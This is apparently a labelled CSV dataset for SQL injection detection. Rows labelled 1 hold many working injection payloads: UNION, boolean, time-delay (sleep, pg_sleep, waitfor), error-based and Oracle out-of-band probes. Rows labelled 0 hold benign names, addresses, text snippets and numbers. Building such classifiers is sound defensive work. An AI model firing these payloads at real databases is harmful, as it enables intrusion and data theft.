Sentence,Label
" An institution lengthened shadow one man; as, Monachism, Hermit Antony; Reformation, Luther; Quakerism, Fox; Methodism, Wesley; Abolition, Clarkson",0
2451542120615034,0
c?idiana,0
1  )  )   as fqee where 3286 = 3286,1
 100% vegetable diet ,0
1'|| ( select 'lzzr' where 2477 = 2477,1
ruick_heasley4@18horas.ro,0
"1%"" and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
grin,0
1 )  as nmlm where 9872 = 9872,1
l23re1o,0
grant,0
caridad,0
"1"" )  as jiiq where 6847 = 6847",1
mara de aranz,0
"-9737""  )  )   )  order by 1--",1
amalio,0
1'|| ( select 'ypqa' where 1961 = 1961 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   ) ||',1
or 1 = 1--,1
noely,0
"-8308"" )  union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",1
putrino escortell,0
13750,0
alkin@lesionesmusculares.pf,0
ontiveros@masqueclases.th,0
amberina,0
f399ici0,0
1 )  where 2307 = 2307,1
hindman@primeracasa-ebs.il,0
"1' )  as keom where 7524 = 7524 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
stanger-kitabayashi7@gestionsoftware.th,0
1'  )  )   and 7533 = 7533 and   (  (  'ialm' = 'ialm,1
" Whether producing soap , turning candles , felting making silk , suitable activity whatever age ",0
1' )  as ubvf where 5923 = 5923 and 8490 = 4925--,1
"-2028%'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( '%' = '",1
"select * from generate_series ( 4592,4592,case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1--",1
"1%""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""%"" = """,1
"1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'",1
arenillas de riopisuerga,0
01450,0
" The deadline applications Monday 11 November , 6: 00 p",0
"1', ( case when 3598 = 2118 then 1 else null end ) ",1
"1""  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""xqlh"" = ""xqlh",1
95!6a752a,0
"-1600%""  )  )   )  or elt ( 4568 = 7693,7693 )  and   (  (   ( ""%"" = """,1
1' and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'lvyw' = 'lvyw,1
47eg0,0
"1%' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
1'+ ( select eluw where 6210 = 6210,1
"-4515"" )  or elt ( 4545 = 2509,2509 )  and  ( ""lglx"" = ""lglx",1
"-2790' )  as xhct where 5756 = 5756 union all select 5756,5756#",1
" An oral argument city &apos;s appeal scheduled sometime March 14 , 2014 ",0
necforo,0
46815,0
bedmar,0
" How fast change implemented vary airline , FAA Administrator Michael Huerta said news conference ",0
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1
"1  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 1729 = 1729",1
tolondro,0
"c/ rafael belmonte garcia, 29,",0
"-4876""  )  )   as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",1
1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5  )  )  +',1
condado de trevio,0
3053383097473695,0
ireland-lamargue@arrsys.ba,0
c/ barja 187,0
"c/ las niadas, 67 9?f",0
rond,0
" See line sufficient distance, straightens average tendency",0
credido poma,0
"1 union all select null,null,null,null,null,null,null#",1
ci2586ta,0
70190724z,0
730,0
orfebrera,0
7$34mon3a5,0
se1ns9tam9nte,0
"1%""  )  )   order by 1#",1
 select * from users where id = '1' <@$_ or 1 = 1 -- 1',1
" Well, men bound eyes one another handkerchief, attached one communities opinion",0
8652159260069074,0
"1%'  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  '%' = '",1
a corua,0
espechar,0
c/ dique de abrigo 96 5?h,0
5107,0
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1
b3m85rd493,0
2253152365761758,0
in85ecuacin,0
-6215' )  or  ( 8459 = 8459 ) *4906,1
0928851427911664,0
842is2n,0
 Globe-trotting jet sellers even carry tape measures check competing layouts ,0
"-2071 union all select 4753,4753--",1
symington@portaldesign.md,0
longo,0
"1""  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""dqis"" = ""dqis",1
"' or benchmark ( 10000000,MD5 ( 1  )  )  #",1
37160,0
tunaroza capmany,0
4809909158427521,0
1%' rlike sleep ( 5 ) #,1
mazzotti9@novaservicios.bi,0
1447,0
franceschini,0
1'+ ( select 'hhnz' where 2465 = 2465,1
guabo,0
parkin,0
"1' and elt ( 3247 = 3969,3969 )  and 'xcbm' like 'xcbm",1
"c/ conquista 94, 1?c",0
" select * from users where id = 1. <@ union select 1,version (  )  -- 1",1
"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- ztzu",1
"1"" )  as xylo where 2112 = 2112 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
sopista,0
"marcelino suarez 39,",0
yihban,0
c/ badaia 10 10-h,0
barceo,0
jessa,0
7208264078394889,0
desortija0a,0
"1'  )  )   )  and make_set ( 6094 = 2929,2929 )  and   (  (   ( 'gkyo' = 'gkyo",1
" Forty percent Roman Catholics South America , tiny number cardinals ",0
arraigadura,0
kilbank,0
-9690 union all select 7217#,1
ostyn.martan@icodea.lu,0
" select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
" Among participants also numerous amateur cyclists wanted chance practice hobby competitive environment , particular short distance 15 kilometres 300 metre climb ",0
31519125v,0
" &quot; &quot; Adults able make decisions legal gender , &quot; said ",0
14554532v,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( 'qhgp' = 'qhgp",1
-1127 or 7391 = 4954,1
doa menca,0
zoratti,0
pedemonte@mystyleperfume.th,0
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'ymnm' = 'ymnm,1
0445247977004873,0
l+echosa,0
paragon.calithness@callalelaboca.be,0
"1%' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
8496429893525706,0
castellanos de castro,0
7714584958323378,0
"1"" )  where 6897 = 6897",1
arrafiz,0
" select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1",1
jole,0
" &quot; We working assumption increase 1 cent plus x , &quot; said Bias , figure likely closer 2 cents ",0
-5580 or 4829 = 1968,1
"1%' union all select null,null,null,null#",1
 He said European leaders need honest people kind espionage programs &apos;ve used years ,0
1' in boolean mode )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) #,1
roderigo,0
1'  )  )   as hqhs where 5383 = 5383,1
berber_wosper@foreignoffice.kn,0
31282,0
kunkel,0
 end,1
 The company upgraded full year profit forecast looking record earnings holidaymakers Australia United Kingdom ,0
 This mail server sends content provider Benni uses ,0
stapley@cirugiaplasticacordoba.jm,0
prestrud,0
ranez@sandrasummer.bi,0
"-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",1
2925,0
porta catorce 60 6?f,0
2isopada,0
"c/ tello de guzman 158,",0
7993090576542905,0
nandan,0
mascaro-cimino@3horas.dk,0
1 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  -- fyaq,1
basta,0
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ",1
"1 )  where 4226 = 4226 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
cerda de vigo,0
"1' where 8451 = 8451 union all select null,null,null,null,null,null,null,null,null#",1
mcinerne,0
wooland@indagacion.td,0
05212,0
52137467d,0
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""bkoq"" = ""bkoq",1
montesa,0
"ciri, 23, 5?a",0
mirko,0
1'  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( 'eihl' = 'eihl,1
45939,0
-5039 union all select 2114#,1
07789163y,0
sirola@professionalhost.cc,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '",1
travs elias,0
4844031303966042,0
"1  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
waitfor delay '0:0:5' and   (  (  'uvlf' = 'uvlf,1
 A study aiming increase benefits Scotland HS2 rail project announced UK government ,0
shih_brusse@professionalhost.jp,0
5323,0
1 )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( 7015 = 7015,1
1 )  as lvfu where 5831 = 5831 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
" — ‘Ah, shall sure misunderstood",0
inclemente,0
"1"" )  where 6018 = 6018 and 7533 = 7533--",1
14977979b,0
39664,0
1' )  where 8707 = 8707 and 3210 = 1477--,1
2945760463066879,0
"1"" )  as vqkz where 8536 = 8536",1
"1"" )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( ""igop"" = ""igop",1
"pl. constitucion, 61",0
insert,1
yutaka,0
guasch xifr,0
34575761e,0
shupe,0
"1 )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"camino viejo, 2,",0
" &quot; The 100-year-old natural stone wall , serving foremost boundary old school yard - due renovated - Kirchstrasse , feature renovation cost plan town Bräunlingen ",0
alimena,0
"1'|| ( select 'tdcr' where 6792 = 6792 union all select null,null,null,null,null#",1
"1 )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
inocencio,0
"1%""  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""%"" = """,1
3674,0
"1"" waitfor delay '0:0:5'",1
janssen,0
marsal infante,0
"-1030"" where 2161 = 2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1
soeltoft@nanogenerador.pr,0
1 )  where 1402 = 1402,1
"-5622"" where 7970 = 7970 union all select 7970,7970,7970,7970,7970--",1
"calle pintor julian alcaraz, 108, 10-a",0
55950989q,0
0293148493278191,0
"1"" )  as dfmm where 7563 = 7563 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
46439230e,0
" Another conundrum: Although boys getting facial pubic hair younger ages , trend toward full-blown early puberty pronounced girls ",0
lagunaseca,0
aforismo,0
-7624' )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'iwab' = 'iwab,1
1'|| ( select 'tzxr' from dual where 2934 = 2934 and 4595 = 4595#,1
" Larger vehicles , example transport long logs , would able wait event oncoming traffic , without block railway line ",0
select  ( case when  ( 1724 = 6528 )  then 1724 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"1"" )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( ""lsis"" like ""lsis",1
garantir,0
" Kenyan press outraged controversial media law &quot; It frightening place , valid ask: prevent Parliament simply sweeping away independence judiciary tomorrow ? &quot; paper said , challenging bill unconstitutional ",0
plans baquerizo,0
andosilla,0
-9331' or  ( 4519 = 2912 ) *2912 and 'rddk' = 'rddk,1
"1' where 9222 = 9222 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
5337,0
sunderla,0
 He jailed minimum six years ,0
albiol,0
terangue,0
pdf 201704/00001491529916625,0
kaufherr.gargoet@santacruzdelvoto.sh,0
"1%""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""%"" = """,1
"1'  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (  'fegp' = 'fegp",1
"1' )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1
camarillo guillen,0
3e43a01n8,0
 Nor types people use pawnbrokers financially stretched ,0
a99b3do,0
" The activist group , tracking death toll network activists Syria , said Thursday 120,296 people died ",0
ceferina,0
45130,0
"1'  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'sied' = 'sied",1
1'|| ( select 'vasx' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  ||',1
" select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1",1
abbot,0
1621765359998786,0
recelosa,0
entrepalmadura,0
nuda drudes,0
"-4427'  )  )   union all select 6357,6357,6357,6357,6357#",1
winston@chinavende.bi,0
 Only psychological strain becomes severe people give consideration ,0
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'gwew' like 'gwew",1
"-5998%"" )  union all select 2366,2366,2366,2366#",1
 select * from users where id = 1 +$+ or 1 = 1 -- 1,1
6243309452199598,0
huesca,0
1 )  as uuro where 6784 = 6784,1
5357,0
"romana, la",0
" Indeed , demand across parts southeast Asia - household debt rising - ValueMax , carrying transaction , week became third pawnshop list Singapore stock exchange ",0
"antonio toledano, 78, 10?h",0
1' )  as ghvi where 3880 = 3880 and 4595 = 4595#,1
alins,0
montaesismo,0
"palanca 106,",0
" Typically pawnbrokers Singapore charge effective annual percentage rate 17 per cent , 15",0
orom videaux,0
"-8612"" )  or 4043 = 3083 and  ( ""pjzo"" like ""pjzo",1
88,0
cubilla,0
hanny,0
30840,0
"fivasa, 15,",0
"1' union all select null,null,null,null,null--",1
"1"" )  as firv where 4522 = 4522 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
91328189l,0
" &quot; CASA currently specific regulations governing use electronic devices aircraft , &quot; said ",0
trisha,0
8533,0
"-8178 )  union all select 4163,4163,4163,4163,4163,4163,4163--",1
44370,0
i02tent0,0
14602519a,0
hormachea vilamasa,0
"calle las mimosas, 109 5?f",0
"1"" )  where 7228 = 7228",1
leda,0
"-2319 union all select 5068,5068,5068#",1
" &quot; They absolutely think son murdered , &quot; Benjamin Crump , attorney representing Kenneth Jacquelyn Johnson , told FoxNews",0
"port fangos, 183,",0
"pasaje pedrosa 115, 6f",0
-5299 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1
shedd,0
"1%' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( '%' = '",1
7512207991188731,0
"calle castellet 94,",0
7857158360903973,0
afijacin,0
9184060552279623,0
-2920'  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'rzey' = 'rzey,1
" There one joint Parish Council Foundation Council , rector represented virtue office ",0
6a0ato,0
"1 )  where 1270 = 1270 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1'|| ( select 'nbmo' from dual where 5572 = 5572 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"-2397  )  )   as oizy where 1746 = 1746 union all select 1746,1746,1746,1746,1746,1746#",1
addetia,0
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  ",1
"1' )  where 9006 = 9006 union all select null,null,null,null,null,null--",1
ursala,0
kellard@todobetis.gf,0
1  )  )   as qsos where 2721 = 2721 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1
" What wrong people continually throw fast food bags car window ? ! At weekend particular , discarded paper bags found side road car parks ",0
4928753717678188,0
octgona,0
select case when 7717 = 7717 then 1 else null end--,1
1o3u91,0
" Every true man cause, country, age; requires infinite spaces numbers time fully accomplish design; — posterity seem follow steps train clients",0
etxebarria,0
1' )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'ohqs' like 'ohqs,1
c4l6716o,0
c/ hermanos pinzon 178,0
' or ''&',1
87337571q,0
"1""  )  )   as jmoy where 9676 = 9676 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
9140660684303193,0
"1"" )  as dgzf where 4834 = 4834",1
06110,0
 How back plane laid - particularly whether seating 9 10 abreast - central economic performance claims made new &quot; mini-jumbo &quot; jet designs ,0
" Basharat Ditta , 42 , would feed sensitive intelligence crime lord Neil Scarbrough inquiries drug trafficking activities became compromised cocaine habit ",0
9625616287143216,0
"1' )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'maln' like 'maln",1
"-8094 )  or elt ( 1032 = 1032,3623 )  and  ( 4569 = 4569",1
gas40so,0
22063837y,0
"1'+ ( select 'myrb' where 3622 = 3622 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",1
baruf,0
 select * from users where id = '1' *$ . or 1 = 1 -- 1',1
laumann mancha,0
1'  )  )   as ypgz where 8704 = 8704,1
babuchera,0
enriquecedora,0
12186635q,0
maello,0
31391,0
-9005 union all select 4410#,1
-7319 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
" Thus , developing underlying technical protocols , attention given creating stable foundation interception-proof exchange mail ",0
"1%"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and ""%"" = """,1
" But 38 , committed suicide ",0
"abubilla, 125 12h",0
" &quot; They &apos;re experienced racers , people looking excitement adventure , achievable path towards world-class events ",0
norton@lesionesmusculares.uz,0
46183,0
"1' )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
94lp90ulo,0
"1 )  as zdym where 1578 = 1578 union all select null,null,null#",1
 Shortly Schänzle roundabout noticed left-turn lane going direction Stromeyersdorfstraße moved across right lane ,0
wookie,0
"1' )  where 5071 = 5071 union all select null,null,null,null,null,null,null--",1
1'  )  )   as jtmf where 3937 = 3937,1
v$idr3ar,0
brockie,0
" Of 30 proposals , two remain end selection procedure ",0
leilan,0
"cami sant cugat al papiol 59,",0
0456219474080004,0
8185948553220105,0
*/*,1
"plaza minayo, 2",0
"c/ costa verde, 100 4c",0
"-8950""  )  )   as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
"1"" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""ilrk"" = ""ilrk",1
roehn.kernke@eldeseodepecar.ec,0
santa mara de la vega,0
49240,0
-7021' or 3038 = 3038,1
1258990500975774,0
"1"" )  where 9499 = 9499",1
 Let case serve warning criminals one beyond reach law ,0
"1%"" order by 1--",1
16824275m,0
"1 )  union all select null,null,null,null,null,null,null,null--",1
"1 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1"" )  where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
feld_zaleska@laschinas.pl,0
protoalbitar,0
"1"" and 7533 = 7533",1
96527161w,0
"plaa esplanada, s/n 13-d",0
"1, ( select  ( case when  ( 1609 = 1609 )  then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases )  end  )  )  ",1
8515880791800894,0
" Green Party parliament representative , Hans-Christian Ströbele , yesterday first German politician meet Snowden Moscow , discuss scandal ",0
"1""  )  )   )  union all select null,null,null,null,null,null,null,null,null,null#",1
" As result , important collaboration developed gynaecologist , Hanne , performed countless operations several journeys location ",0
62397798v,0
74,0
"1'  )  )   and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"-7889""  )  )   as oayf where 1765 = 1765 or 8571 = 8571--",1
 &quot; The news came day Credit Suisse announced dismissed trader London exchange traded funds desk week caused nearly $ 6m loss late last year ,0
24152,0
ot5ora,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
f536e6a,0
nishan5,0
53364918l,0
"1'+ ( select qymy where 8657 = 8657 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
5658181511648002,0
1' )  as syer where 3141 = 3141 rlike  ( select  ( case when  ( 6233 = 7567 )  then 1 else 0x28 end  )  )  --,1
"calle marques de montevirgen, 183",0
davids,0
"1'  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
" select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'",1
cauthen3,0
1 and  ( 1977 = 6852 ) *6852-- clxl,1
rib cruanas,0
50692,0
0estot32,0
fal429a,0
"1 where 6408 = 6408 union all select null,null,null,null,null,null,null,null--",1
433,0
hinton-s,0
ornela,0
"1%"" )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
ajoy,0
45210940r,0
casas de miravete,0
"1""  )  )   union all select null,null--",1
seglar,0
 health statistics ,0
 In August year two breakdowns single week ,0
-2912'  )  )   order by 1--,1
holdaway,0
queijo pintat,0
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1
select  ( case when  ( 3537 = 5218 )  then 3537 else 3537* ( select 3537 from mysql.db )  end ) #,1
"1"" where 5440 = 5440 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
nickolau,0
"1 )  union all select null,null,null,null,null,null,null,null,null,null#",1
"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt",1
1%' )  and  ( 3020 = 3020 ) *6703 and  ( '%' = ',1
"-3781%' )  union all select 7497,7497,7497,7497,7497--",1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'yaml' = 'yaml",1
pizzanel,0
eimile,0
211,0
minera dauns,0
patanera,0
1' and  ( 3020 = 3020 ) *6703 and 'qsrz' = 'qsrz,1
kirady,0
"1"" where 9332 = 9332 union all select null,null,null,null,null,null,null,null,null--",1
escamn,0
"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '",1
d0s9pi2car,0
22011041h,0
bascuana de san pedro,0
